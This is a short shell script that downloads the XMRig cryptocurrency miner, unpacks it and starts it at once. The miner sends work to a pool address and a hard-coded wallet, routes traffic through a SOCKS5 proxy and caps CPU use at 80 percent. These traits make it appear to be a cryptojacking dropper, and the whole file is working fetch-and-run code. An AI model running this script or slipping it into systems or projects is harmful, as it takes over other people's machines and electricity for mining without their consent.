#!/bin/sh
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz && tar -xvf xmrig-6.18.0-bionic-x64.tar.gz && cd xmrig-6.18.0-bionic-x64 && ./xmrig -a rx/0 172.20.144.1:3333 -u TRX:TBbwEfGT2h9iXXPbu1p9bgbjKK8YqegfYM -p x --max-cpu-usage 80 -x socks5://50.116.14.201:7497 -k --tls
